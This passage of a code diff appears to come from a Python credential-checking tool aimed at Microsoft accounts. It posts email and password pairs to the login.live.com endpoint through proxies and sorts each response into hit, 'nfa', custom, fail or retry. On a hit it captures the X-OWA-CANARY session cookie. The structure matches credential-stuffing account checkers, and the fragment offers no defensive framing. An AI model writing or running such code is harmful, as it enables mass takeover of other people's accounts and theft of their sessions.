+                if self.found(self.nfaMICROSOFT, r.text):
+                    return ["nfa"]
+            
+                if self.found(self.customMICROSOFT, r.text):
+                    return ["custom"]
+                
+                if self.found(self.failMICROSOFT, r.text):
+                    return ["fail"]
+
+                if self.found(self.retryMICROSOFT, r.text):
+                    return ["retry"]
+                
+                return ["ok", r.cookies.get("X-OWA-CANARY")]
+
+            except:
+                return ["retry"]
+        else:
+            try:
+                r = session.post("https://login.live.com/ppsecure/post.srf?client_id=82023151-c27d-4fb5-8551-10c10724a55e&contextid=A31E247040285505&opid=F7304AA192830107&bk=1701944501&uaid=a7afddfca5ea44a8a2ee1bba76040b3c&pid=15216", headers=self.headersMICROSOFT, data=self.payloadMICROSOFT(email, password), timeout=200, proxies=proxy)
+
+                if self.found(self.hitsMICROSOFT, r.text):
+                    return ["ok", r.cookies.get("X-OWA-CANARY")]
+
+                if self.found(self.nfaMICROSOFT, r.text):
+                    return ["nfa"]
+            
+                if self.found(self.customMICROSOFT, r.text):
+                    return ["custom"]
+                
+                if self.found(self.failMICROSOFT, r.text):
+                    return ["fail"]
+
+                if self.found(self.retryMICROSOFT, r.text):
+                    return ["retry"]
+                
+                return ["ok", r.cookies.get("X-OWA-CANARY")]
+
+            except:
+                return ["retry"]
+            
+    # ----------------------------------------------------- #
